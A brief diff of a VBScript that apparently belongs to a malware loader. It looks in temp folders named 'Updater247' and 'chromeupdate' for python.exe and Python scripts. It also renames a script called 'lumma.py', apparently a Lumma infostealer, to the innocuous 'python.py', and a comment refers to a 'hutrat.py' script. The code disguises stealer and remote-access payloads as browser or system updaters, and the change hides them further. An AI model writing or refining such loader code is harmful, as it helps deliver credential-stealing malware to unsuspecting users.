@@ -27,7 +27,7 @@ End Function
 ' =============================
 ' Tìm python.exe và file py trong Updater247
 pyExe1 = FindFile(tempFolder & "Updater247", "python.exe")
-pyScript1 = FindFile(tempFolder & "Updater247", "lumma.py")
+pyScript1 = FindFile(tempFolder & "Updater247", "python.py")
 
 ' Tìm python.exe và file py trong chromeupdate (đổi sang hutrat.py)
 pyExe2 = FindFile(tempFolder & "chromeupdate", "python.exe")
